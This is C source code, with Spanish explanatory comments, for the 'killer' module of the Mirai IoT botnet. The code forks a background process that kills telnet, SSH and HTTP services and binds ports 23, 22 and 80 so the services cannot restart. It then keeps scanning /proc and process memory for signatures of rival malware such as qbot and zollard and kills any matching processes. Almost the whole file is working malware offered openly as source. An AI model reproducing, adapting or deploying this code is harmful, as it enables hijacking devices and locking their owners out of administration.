/**
 * @file killer.c
 * @brief Módulo del bot Mirai encargado de eliminar procesos competidores y servicios no deseados
 *
 * Este módulo implementa funcionalidades para:
 * - Detectar y eliminar otros bots maliciosos
 * - Deshabilitar servicios comunes como telnet, SSH y HTTP
 * - Escanear la memoria de procesos en busca de patrones maliciosos
 * - Proteger el bot contra la eliminación
 */

#define _GNU_SOURCE  // Habilita características GNU extendidas

#ifdef DEBUG
#include <stdio.h>  // Inclusión condicional para funciones de depuración
#endif
#include <unistd.h>     // Para fork(), getpid(), etc.
#include <stdlib.h>     // Para malloc(), atoi()
#include <arpa/inet.h>  // Para funciones de red
#include <linux/limits.h> // Para PATH_MAX
#include <sys/types.h>  // Para tipos de sistema
#include <dirent.h>     // Para manipulación de directorios
#include <signal.h>     // Para kill()
#include <fcntl.h>      // Para open()
#include <time.h>       // Para time()

#include "includes.h"   // Definiciones comunes del bot
#include "killer.h"     // Prototipos del killer
#include "table.h"      // Funciones de tabla de cadenas
#include "util.h"       // Utilidades comunes

/**
 * @var killer_pid
 * @brief PID del proceso killer hijo
 */
int killer_pid;

/**
 * @var killer_realpath
 * @brief Ruta real del ejecutable del killer
 */
char *killer_realpath;

/**
 * @var killer_realpath_len
 * @brief Longitud de la ruta real del ejecutable
 */
int killer_realpath_len = 0;

/**
 * @brief Inicializa y ejecuta el proceso killer del bot
 * 
 * Esta función realiza las siguientes tareas:
 * 1. Se bifurca en un proceso hijo dedicado
 * 2. Mata y previene el reinicio de servicios comunes (telnet, SSH, HTTP)
 * 3. Escanea continuamente procesos en busca de otros malware
 * 4. Protege al bot contra intentos de eliminación
 * 
 * El proceso killer se ejecuta en segundo plano y monitorea constantemente
 * el sistema en busca de amenazas potenciales.
 */
void killer_init(void)
{
    // Variables de control para el escaneo de procesos
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;  // Estructura para vincular puertos

    // Bifurca el proceso para ejecutar el killer en segundo plano
    // El proceso padre continúa con la ejecución principal
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)  // Si es el padre o hubo error
        return;

    // Configura la estructura de dirección para vincular puertos
    // Esto se usa para prevenir que otros servicios se reinicien
    tmp_bind_addr.sin_family = AF_INET;  // Familia de direcciones IPv4
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;  // Escucha en todas las interfaces

    // Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif

    // Kill SSH service and prevent it from restarting
#ifdef KILLER_REBIND_SSH
    if (killer_kill_by_port(htons(22)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/22 (SSH)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/22 (SSH)\n");
#endif
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef KILLER_REBIND_HTTP
    if (killer_kill_by_port(htons(80)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/80 (http)\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/80 (http)\n");
#endif
#endif

    // Espera un momento antes de obtener la ruta real del ejecutable
    // Esto es necesario en caso de que el binario esté siendo eliminado
    // o movido durante la inicialización
    sleep(5);

    // Aloca memoria para almacenar la ruta real del ejecutable
    killer_realpath = malloc(PATH_MAX);  // PATH_MAX es la longitud máxima de ruta en el sistema
    killer_realpath[0] = 0;              // Inicializa como cadena vacía
    killer_realpath_len = 0;             // Inicializa la longitud como 0

    // Verifica si podemos acceder al ejecutable a través de /proc/self/exe
    if (!has_exe_access())
    {
#ifdef DEBUG
        printf("[killer] Machine does not have /proc/$pid/exe\n");
#endif
        return;
    }
#ifdef DEBUG
    printf("[killer] Memory scanning processes\n");
#endif

    // Bucle principal del killer
    // Escanea continuamente todos los procesos del sistema en busca de:
    // - Otros bots maliciosos
    // - Procesos que intenten eliminar nuestro ejecutable
    // - Procesos con patrones de memoria sospechosos
    while (TRUE)
    {
        DIR *dir;             // Directorio /proc para enumerar procesos
        struct dirent *file;  // Entrada de directorio actual

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;  // Incrementa el contador de procesos escaneados
            
            // Verifica si ya hemos escaneado este PID
            if (pid <= killer_highest_pid)
            {
                // Si ha pasado más tiempo que KILLER_RESTART_SCAN_TIME, reinicia el escaneo
                // Esto es necesario para detectar procesos que hayan aparecido en PIDs más bajos
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
#ifdef DEBUG
                    printf("[killer] Han pasado %d segundos desde el último escaneo. ¡Re-escaneando todos los procesos!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;  // Reinicia desde el PID mínimo
                }
                else
                {
                    // Duerme ocasionalmente para permitir que aparezcan nuevos procesos
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);  // Espera 1 segundo cada 10 procesos escaneados
                }

                continue;  // Salta al siguiente proceso
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            // Construye la ruta al archivo ejecutable del proceso (/proc/[pid]/exe)
            // Esta ruta es un enlace simbólico al ejecutable real del proceso
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));  // Agrega "/proc/"
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);                                 // Agrega el PID
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));   // Agrega "/exe"

            // Construye la ruta al archivo de estado del proceso (/proc/[pid]/status)
            // Este archivo contiene información sobre el estado del proceso
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));    // Agrega "/proc/"
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);                                   // Agrega el PID
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));  // Agrega "/status"

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

            // Verifica si el proceso es otro bot conocido por su patrón en el nombre
            table_unlock_val(TABLE_KILLER_ANIME);
            // Si la ruta contiene el patrón ".anime", elimina el ejecutable y mata el proceso
            if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
            {
                unlink(realpath);  // Elimina el ejecutable
                kill(pid, 9);      // Mata el proceso con SIGKILL
            }
            table_lock_val(TABLE_KILLER_ANIME);                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
#ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            } 

            /*
            if (upx_scan_match(exe_path, status_path))
            {
#ifdef DEBUG
                printf("[killer] UPX scan match for binary %s\n", exe_path);
#endif
                kill(pid, 9);
            }
            */

            // Don't let others memory scan!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

/**
 * @brief Termina el proceso killer
 * 
 * Envía una señal SIGKILL al proceso killer para terminarlo inmediatamente.
 * Esta función se llama cuando el bot necesita finalizar limpiamente.
 */
void killer_kill(void)
{
    kill(killer_pid, 9);  // Envía SIGKILL al proceso killer
}

/**
 * @brief Mata procesos que estén usando un puerto específico
 * 
 * @param port Puerto a verificar en formato de red (big-endian)
 * @return BOOL TRUE si se encontró y mató algún proceso, FALSE en caso contrario
 * 
 * Busca en /proc/net/tcp procesos que estén escuchando en el puerto especificado
 * y los termina. Se usa principalmente para matar servicios como telnet o SSH.
 */
BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    // Lee línea por línea el archivo /proc/net/tcp
    // Este archivo contiene información sobre todas las conexiones TCP
    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;  // Índices para parsear la línea

        // Busca el primer ':' que separa el número de entrada del resto
        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;  // Línea malformada, salta a la siguiente
        i += 2;  // Salta el ':' y el espacio siguiente
        ii = i;  // Guarda la posición de inicio de la dirección local

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            // Analiza las columnas de la línea de /proc/net/tcp
            // El formato es: sl  local_address rem_address  st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
            int column_index = 0;        // Índice de la columna actual
            BOOL in_column = FALSE;      // Indica si estamos dentro de una columna
            BOOL listening_state = FALSE; // Indica si el socket está en estado LISTEN

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;  // Encontró un separador de columnas
                else
                {
                    if (in_column == TRUE)
                        column_index++;  // Nueva columna encontrada

                    // Verifica si el socket está en estado LISTEN (0x0A)
                    // La columna 4 (índice 1) contiene el estado del socket
                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;  // Ya no estamos en un separador
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

/**
 * @brief Verifica si el proceso tiene acceso a su propio ejecutable
 * 
 * @return BOOL TRUE si tiene acceso, FALSE en caso contrario
 * 
 * Verifica si el proceso puede acceder a su archivo ejecutable a través de
 * /proc/[pid]/exe. También obtiene y almacena la ruta real del ejecutable
 * para comparaciones posteriores.
 */
static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    // Copy /proc/$pid/exe into path
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    // Try to open file
    if ((fd = open(path, O_RDONLY)) == -1)
    {
#ifdef DEBUG
        printf("[killer] Failed to open()\n");
#endif
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
#ifdef DEBUG
        printf("[killer] Detected we are running out of `%s`\n", killer_realpath);
#endif
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}

/*
static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;

    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }

    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    //eyy

    close(fd);
    return FALSE;
}
*/

/**
 * @brief Escanea la memoria de un proceso en busca de patrones maliciosos
 * 
 * @param path Ruta al archivo de memoria del proceso (/proc/[pid]/mem)
 * @return BOOL TRUE si se encontró algún patrón malicioso, FALSE en caso contrario
 * 
 * Busca patrones conocidos de otros malware (qbot, zollard, etc) en la
 * memoria del proceso. Se usa para detectar y eliminar otros bots.
 */
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];  // Buffer para lectura de memoria
    // Punteros a los patrones de malware a buscar
    char *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;
    // Longitudes de los patrones respectivos
    int m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;
    BOOL found = FALSE;  // Indica si se encontró algún patrón malicioso

    // Intenta abrir el archivo de memoria del proceso
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;  // Si no se puede abrir, no hay coincidencia

    table_unlock_val(TABLE_MEM_QBOT);
    table_unlock_val(TABLE_MEM_QBOT2);
    table_unlock_val(TABLE_MEM_QBOT3);
    table_unlock_val(TABLE_MEM_UPX);
    table_unlock_val(TABLE_MEM_ZOLLARD);

    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &m_qbot2_len);
    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &m_qbot3_len);
    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &m_upx_len);
    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &m_zollard_len);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_QBOT);
    table_lock_val(TABLE_MEM_QBOT2);
    table_lock_val(TABLE_MEM_QBOT3);
    table_lock_val(TABLE_MEM_UPX);
    table_lock_val(TABLE_MEM_ZOLLARD);

    close(fd);

    return found;
}

/**
 * @brief Busca una subcadena en un buffer de memoria
 * 
 * @param buf Buffer donde buscar
 * @param buf_len Longitud del buffer
 * @param str Cadena a buscar
 * @param str_len Longitud de la cadena
 * @return BOOL TRUE si se encontró la cadena, FALSE en caso contrario
 * 
 * Implementa un algoritmo de búsqueda de subcadenas byte a byte. Se usa
 * para encontrar patrones específicos en la memoria de los procesos.
 */
static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;  // Contador de coincidencias consecutivas

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
